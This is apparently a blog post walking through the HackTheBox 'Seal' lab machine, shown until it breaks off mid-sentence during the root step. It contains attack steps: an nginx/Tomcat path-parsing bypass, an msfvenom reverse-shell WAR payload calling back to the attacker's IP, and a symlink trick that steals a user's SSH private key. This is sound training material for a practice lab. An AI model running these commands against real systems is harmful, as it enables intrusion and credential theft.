<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox Seal" /><meta property="og:locale" content="en" /><meta name="description" content="Machine information" /><meta property="og:description" content="Machine information" /><link rel="canonical" href="https://am-root.github.io/posts/HTB-Seal/" /><meta property="og:url" content="https://am-root.github.io/posts/HTB-Seal/" /><meta property="og:site_name" content="amroot" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-20T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox Seal" /><meta name="twitter:site" content="@_amroot" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"mainEntityOfPage":{"@type":"WebPage","@id":"https://am-root.github.io/posts/HTB-Seal/"},"description":"Machine information","url":"https://am-root.github.io/posts/HTB-Seal/","@type":"BlogPosting","headline":"HackTheBox Seal","dateModified":"2021-11-20T00:00:00+00:00","datePublished":"2021-11-20T00:00:00+00:00","@context":"https://schema.org"}</script><title>HackTheBox Seal | amroot</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="amroot"><meta name="application-name" content="amroot"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/hacker.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">amroot</a></div><div class="site-subtitle font-italic">CTF writeups and Infosec blogs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-root" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_amroot" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['janakskhairmode','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/amroot" aria-label="linkedin" class="order-6" > <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox Seal</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox Seal</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Janak Khairmode </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Nov 20, 2021, 12:00 AM +0000" >Nov 20, 2021<i class="unloaded">2021-11-20T00:00:00+00:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1782 words">9 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-proofer-ignore data-src="/image/hackthebox/seal/sealinfocard.png" class="preview-img" alt="sealinfocard" width="1000" height="400"><h1 id="machine-information">Machine information</h1><p>Seal is very entertaining machine. First discovering Vhost of the machine and running <code class="language-plaintext highlighter-rouge">ffuf</code> against it showed few directories that were used in Apache Tomcat server. Another Service is running on port 8080, Gitbucket, after signing on the portal gave 2 repositories, in one of the repository’s commit had credentials for <code class="language-plaintext highlighter-rouge">tomcat</code> user, but tomcat login portal is being blocked by nginx configuration that are coded in the repository. To access the portal, <code class="language-plaintext highlighter-rouge">tomcat</code> and <code class="language-plaintext highlighter-rouge">nginx</code> has a flaw which was explained and how to exploit it in great BlackHat talk by OrangeTsai - Breaking the Parser. After abusing the flaw and uploading malicious <code class="language-plaintext highlighter-rouge">war</code> file and getting shell as <code class="language-plaintext highlighter-rouge">tomcat</code> user, I discovered some interesting files of Ansible Playbook, an Automation engine, I will abuse the playbook to get to <code class="language-plaintext highlighter-rouge">luis</code> user and after that I will exploit <code class="language-plaintext highlighter-rouge">sudo</code> capability of the <code class="language-plaintext highlighter-rouge">luis</code> user to get to <code class="language-plaintext highlighter-rouge">root</code> user.</p><h1 id="enumeration">Enumeration</h1><h2 id="nmap">nmap</h2><p>As always I will scan for all the open ports with <code class="language-plaintext highlighter-rouge">nmap</code> which is highly revered network scanning tool in the inforsec community.</p><p>Starting nmap with full port scanning without detecting services and storing the results into <strong>all</strong> file prepending with flag -oA.</p><ul><li><code class="language-plaintext highlighter-rouge">-p-</code> : Specifies All ports 0-65535<li><code class="language-plaintext highlighter-rouge">-oA</code> : To print output into files with extensions gnmap,xml,nmap, Here A stands for All.<li><code class="language-plaintext highlighter-rouge">--min-rate=</code> : When the –min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate. And I got the following result,</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nv">$_</span> <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-oA</span> nmap/all 10.10.10.250 <span class="nt">--min-rate</span><span class="o">=</span>10000

Nmap scan report <span class="k">for </span>10.10.10.250
Host is up <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>360.50 seconds
</pre></table></code></div></div><p>Now I scan them to identify running services and nmap pre-installed scripts using <code class="language-plaintext highlighter-rouge">-sV</code> and <code class="language-plaintext highlighter-rouge">-sC</code> flags respectively</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
</pre><td class="rouge-code"><pre><span class="nv">$_</span> <span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,443,8080 <span class="nt">-oA</span> nmap/all 10.10.10.250

<span class="c"># Nmap 7.92 scan initiated Wed Nov 17 19:47:20 2021 as: nmap -sC -sV -p 22,443,8080 -oA nmap/all 10.10.10.250</span>
Nmap scan report <span class="k">for </span>10.10.10.250
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 <span class="o">(</span>RSA<span class="o">)</span>
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 <span class="o">(</span>ED25519<span class="o">)</span>
443/tcp  open  ssl/http   nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Seal Market
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>seal.htb/organizationName<span class="o">=</span>Seal Pvt Ltd/stateOrProvinceName<span class="o">=</span>London/countryName<span class="o">=</span>UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 17 Nov 2021 14:33:44 GMT
|     Set-Cookie: <span class="nv">JSESSIONID</span><span class="o">=</span>node018cpd9xw8xe6zlifq5ogn253e41.node0<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 17 Nov 2021 14:33:43 GMT
|     Set-Cookie: <span class="nv">JSESSIONID</span><span class="o">=</span>node0h2w0ecmom8hh9cnk1cxbdnl39.node0<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 17 Nov 2021 14:33:44 GMT
|     Set-Cookie: <span class="nv">JSESSIONID</span><span class="o">=</span>node0z7vt7nzatw9i1ry86g67uqt7b40.node0<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character <span class="nv">OTEXT</span><span class="o">=</span>0x80
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
|     Content-Length: 71
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">OTEXT</span><span class="o">=</span>0x80&lt;/pre&gt;
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
|     Content-Length: 58
|     Connection: close
|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
|   Socks4: 
|     HTTP/1.1 400 Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x4
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
|     Content-Length: 69
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x4&lt;/pre&gt;
|   Socks5: 
|     HTTP/1.1 400 Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x5
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x5&lt;/pre&gt;
| http-auth: 
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn<span class="s1">'t have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=11/17%Time=61950F21%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Wed,\x2017\x
-- snip--
SF:ontent-Length:\x2071\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\
SF:x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20OTEXT=0x80&lt;/pre&gt;");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 17 19:48:35 2021 -- 1 IP address (1 host up) scanned in 75.76 seconds

</span></pre></table></code></div></div><p>nmap gave hostname which I will add to my hostfile <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><blockquote><p>10.10.10.250 seal seal.htb</p></blockquote><p>what nmap did not gave me is an email address, After running nmap I checked the certificate file of the host. I will remember this just in case.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/02.png" alt="02" /></p><h2 id="visiting-port-443">Visiting Port 443</h2><p>This how the website looks like, there aren’t any interesting directories listed.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/03.png" alt="03" style="zoom:67%;" /></p><p>I ran <code class="language-plaintext highlighter-rouge">ffuf</code> in the backgroud. ffuf is an fuzzing tool to look for any hidden directories.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$_</span> ffuf <span class="nt">-u</span> https://seal.htb/FUZZ <span class="nt">-w</span> /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txt

admin                   <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1]
css                     <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1]
js                      <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1]
images                  <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1]
manager                 <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1]
<span class="nb">.</span>                       <span class="o">[</span>Status: 200, Size: 19737, Words: 7425, Lines: 519]
icon                    <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1]
cmd                     <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1]
</pre></table></code></div></div><p>After visiting <code class="language-plaintext highlighter-rouge">/admin</code> it was revealed to me that this is an Apache Tomcat 9.0.31 server. It is showing 404 for <code class="language-plaintext highlighter-rouge">/admin</code> and <code class="language-plaintext highlighter-rouge">/cmd</code> pages except it is showing 403 for<code class="language-plaintext highlighter-rouge">/manager</code>.</p><h2 id="gitbucket">Gitbucket</h2><p>There is also 8080 port open serving GitBucket. I signed up as <code class="language-plaintext highlighter-rouge">amroot</code> user and logged in.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/05.png" alt="05" style="zoom:80%;" /></p><p>There are 2 repositories listed. Opening them revealed some usernames.</p><blockquote><p>root luis alex</p></blockquote><p>Firstly, I looking at the <code class="language-plaintext highlighter-rouge">seal_market</code> respository. It is using <code class="language-plaintext highlighter-rouge">nginx</code> and <code class="language-plaintext highlighter-rouge">tomcat</code> servers. While looking at the commits, on commit <code class="language-plaintext highlighter-rouge">ac210325afd2f6ae17cce84a8aa42805ce5fd010</code> there are tomcat credentials added.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/06.png" alt="06" /></p><p>On the next commit <code class="language-plaintext highlighter-rouge">971f3aa3f0a0cc8aac12fd696d9631ca540f44c7</code> it was deleted. I don’t have access to login portal so I have to find a way to it.</p><p>In the <code class="language-plaintext highlighter-rouge">seal_market</code> latest commit <code class="language-plaintext highlighter-rouge">db85dc0136b335d873a07420aa8963491c6cd362</code> mentioned a ToDo list.</p><blockquote><ul><li>Remove mutual authentication for dashboard, setup registration and login features.<li>Deploy updated tomcat configuration.<li>Disable manager and host-manager.</ul></blockquote><p>Looking at commit information nginx configurations has been changed.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/07.png" alt="07" style="zoom:80%;" /></p><p>After looking at the code, I googled for <code class="language-plaintext highlighter-rouge">nginx mutual authentication</code> and also because the server is nginx which I got from response header.</p><blockquote><p>Server: nginx/1.18.0 (Ubuntu)</p></blockquote><p>This <a href="https://smallstep.com/hello-mtls/doc/server/nginx">blog post</a> explains how to setup mutual auhentication in nginx server.</p><p>After this I googled for <code class="language-plaintext highlighter-rouge">nginx tomcat exploit</code>, now there is a good blackhat talk from OrangeTsai ‘<a href="https://www.youtube.com/watch?v=28xWcRegncw">Breaking the Parser</a>’ which explains POC on exploitation. This is the <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">white paper</a> for the talk.</p><h1 id="shell-as-tomcat">Shell as Tomcat</h1><p>I used <code class="language-plaintext highlighter-rouge">/foo;name=orange/bar/</code> payload from the talk changed it <code class="language-plaintext highlighter-rouge">/manager;name=orange/html</code> which prompted the login.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/08.png" alt="08" /></p><p>I entered the creds which I found on commit and successfully logged in as tomcat user.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/09.png" alt="09" style="zoom: 50%;" /></p><p>I will just deploy malicious reverse shell war file using <code class="language-plaintext highlighter-rouge">msfvenom</code>. I used following command to create a war file.</p><blockquote><p>msfvenom -p java/shell_reverse_tcp lhost=10.10.14.120 lport=9001 -f war -o amroot.war</p></blockquote><p>I will deploy the file and that gave me a reverse shell.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/10.png" alt="10" style="zoom:80%;" /></p><p>I upgraded my shell for better environment.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/11.png" alt="11" style="zoom:80%;" /></p><h1 id="shell-as-luis">Shell as Luis</h1><h2 id="discovering-ansible-playbook">Discovering Ansible Playbook</h2><p>Now that I have proper envinronment. I started looking for interesting files and I came across Ansible directory in <code class="language-plaintext highlighter-rouge">/opt/backups</code>.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/12.png" alt="12" style="zoom:80%;" /></p><p>What is <a href="https://docs.ansible.com/ansible/latest/user_guide/playbooks_intro.html">Ansible Playbook</a>?</p><p>Ansible Playbooks offer a repeatable, re-usable, simple configuration management and multi-machine deployment system, one that is well suited to deploying complex applications. If you need to execute a task with Ansible more than once, write a playbook and put it under source control. Then you can use the playbook to push out new configuration or confirm the configuration of remote systems. The playbooks in the <a href="https://github.com/ansible/ansible-examples">ansible-examples repository</a> illustrate many useful techniques. You may want to look at these in another tab as you read the documentation.</p><p>Playbooks can:</p><ul><li>declare configurations<li>orchestrate steps of any manual ordered process, on multiple sets of machines, in a defined order<li>launch tasks synchronously or <a href="https://docs.ansible.com/ansible/latest/user_guide/playbooks_async.html#playbooks-async">asynchronously</a></ul><p>The Playbooks are written in YAML languange.</p><p>In the <code class="language-plaintext highlighter-rouge">playbook</code> directory there is only 1 file <code class="language-plaintext highlighter-rouge">run.yml</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: <span class="nv">src</span><span class="o">=</span>/var/lib/tomcat9/webapps/ROOT/admin/dashboard <span class="nv">dest</span><span class="o">=</span>/opt/backups/files <span class="nv">copy_links</span><span class="o">=</span><span class="nb">yes</span>
  - name: Server Backups
    archive:
    	path: /opt/backups/files/
    	dest: <span class="s2">"/opt/backups/archives/backup--.gz"</span>
  - name: Clean
    file:
        state: absent
        path: /opt/backups/files/
</pre></table></code></div></div><p>There Are 3 tasks being run.</p><ol><li>Copy files is copying files from <code class="language-plaintext highlighter-rouge">/var/lib/tomcat9/webapps/ROOT/admin/dashboard</code> to <code class="language-plaintext highlighter-rouge">/opt/backups/files</code> folder using <a href="https://docs.ansible.com/ansible/2.5/modules/synchronize_module.html"><code class="language-plaintext highlighter-rouge">synchronize</code></a> module and <code class="language-plaintext highlighter-rouge">copy_symlink</code> what is important here.<li>Archive those files using <a href="https://docs.ansible.com/ansible/2.5/modules/archive_module.html#archive-module"><code class="language-plaintext highlighter-rouge">archive</code></a> module into <code class="language-plaintext highlighter-rouge">/opt/backups/archives/backup-{timestamps}.gz</code><li>Lastly delete folder ` /opt/backups/files/<code class="language-plaintext highlighter-rouge"> using [</code>File<code class="language-plaintext highlighter-rouge">](https://docs.ansible.com/ansible/2.5/modules/archive_module.html#archive-module) module's </code>state=absent` parameter.</ol><h2 id="abusing-ansible">Abusing Ansible</h2><p>I can abuse this <code class="language-plaintext highlighter-rouge">copy_symlink</code> parameter.</p><blockquote><p>Copy symlinks as the item that they point to (the referent) is copied, rather than the symlink.</p></blockquote><p>Firstly I have to find a writtable location inside <code class="language-plaintext highlighter-rouge">/var/lib/tomcat9/webapps/ROOT/admin/dashboard</code> folder.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/13.png" alt="13" /></p><p>There is <code class="language-plaintext highlighter-rouge">/uploads</code> folder where I can write. Also in the <code class="language-plaintext highlighter-rouge">archives</code> folder is being written every 1 min.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/14.png" alt="14" /></p><p>I can just “write” files from <code class="language-plaintext highlighter-rouge">/home/luis/.ssh/id_rsa</code> and playbook will do its thing.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">ln</span> <span class="nt">-s</span> /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
</pre></table></code></div></div><p>Before <code class="language-plaintext highlighter-rouge">*.gz</code> files were <code class="language-plaintext highlighter-rouge">606047</code> bytes and now after symlinking new gerenerated file was <code class="language-plaintext highlighter-rouge">608923</code> bytes, looks like it worked!</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/15.png" alt="15" /></p><p>I transferred the <code class="language-plaintext highlighter-rouge">backup.gz</code> file on my ParrotOS and after extracting reveals <code class="language-plaintext highlighter-rouge">id_rsa</code> inside <code class="language-plaintext highlighter-rouge">uploads</code> directory. I will use this file to get ssh shell as <code class="language-plaintext highlighter-rouge">luis</code> user using <code class="language-plaintext highlighter-rouge">ssh -i id_rsa luis@seal</code>.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/17.png" alt="17" /></p><h1 id="shell-as-root">Shell as root</h1><h2 id="abusing-sudo--l">Abusing sudo -l</h2><p>Getting root user was extremly easy. First thing I ran after getting shell as <code class="language-plaintext highlighter-rouge">luis</code> was <code class="language-plaintext highlighter-rouge">sudo -l</code> to look for any files I can run as <code class="language-plaintext highlighter-rouge">root</code> user.</p><blockquote><p>luis@seal:~$ sudo -l <br /> Matching Defaults entries for luis on seal: <br /> env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin <br /> User luis may run the following commands on seal: <br /> (ALL) NOPASSWD: /usr/bin/ansible-playbook *</p></blockquote><p>I wrote small playbook from to ping back.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/20.png" alt="20" /></p><p>After running the script I got ping from 